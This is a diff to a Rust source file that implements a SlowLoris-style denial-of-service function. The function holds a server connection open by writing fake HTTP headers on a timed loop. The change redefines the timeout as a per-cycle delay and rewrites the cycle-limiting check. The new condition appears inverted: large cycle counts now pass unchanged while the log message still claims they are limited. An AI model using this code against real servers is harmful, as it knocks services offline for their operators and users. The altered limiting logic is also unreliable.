@@ -6,7 +6,7 @@ use std::thread::sleep_ms;
 
 /// request_attack performs a SlowLoris style delay request attack against a server
 /// which can be written to via the given `connection` (reader/writer). 
-/// `timeout` is the total time for the attack to progress, in milliseconds.
+/// `timeout` is the time between each cycle, in milliseconds.
 /// `cycles` is the number of times a new fake header should be written, or 0 for no additional headers.
 /// `finalize` sets whether or not to send the terminating `\r\n`, and `post` changes the verb from GET to POST.
 /// `threadn` is the thread number of this thread.
@@ -19,12 +19,11 @@ pub fn slowloris_attack<T: Sized + Write>(connection: &mut T, timeout: u32, cycl
 
     // Delay cycle
     // Conditional here limits requests to one per ten milliseconds
-    let real_cycles = if cycles < timeout/10 {cycles} 
+    let real_cycles = if cycles >= timeout/10 {cycles}
                       else {info!("[REQUEST] Too many cycles! Limiting."); timeout/10};
-    info!("[REQUEST:{}] Beginning delay attack: {} ms, {} cycles, {} ms/cycle.", threadn, timeout, real_cycles, timeout/real_cycles);
+    info!("[REQUEST:{}] Beginning delay attack: {} ms timeout, {} cycles, {} ms total.", threadn, timeout, real_cycles, timeout*real_cycles);
     for _ in 0..(real_cycles) {
-        // Timeout / cycles gives the number of ms for one cycle
-        sleep_ms(timeout / cycles);
+        sleep_ms(timeout);
         connection.write_all(b"X-Not-Real: \"Some Bullshit\"\r\n")
             .unwrap_or_else(|e| {error!("[REQUEST:{}] !!! Couldn't write header. {}", threadn, e); panic!();});
     }
